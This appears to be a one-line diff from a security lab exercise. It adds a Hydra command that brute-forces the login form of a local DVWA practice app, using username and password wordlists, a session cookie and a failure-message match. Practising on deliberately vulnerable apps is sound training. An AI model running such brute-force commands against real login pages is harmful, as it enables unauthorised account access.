@@ -1,0 +1,1 @@
+sudo hydra -L diccionario_brute_user_txt -P diccionario_brute_pass.txt http-get-form://localhost:4280/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:security=low;PHPSESSID=jfseb4op29pkb2rlu0vqnjhik5:F=Username and/or password incorrect -V
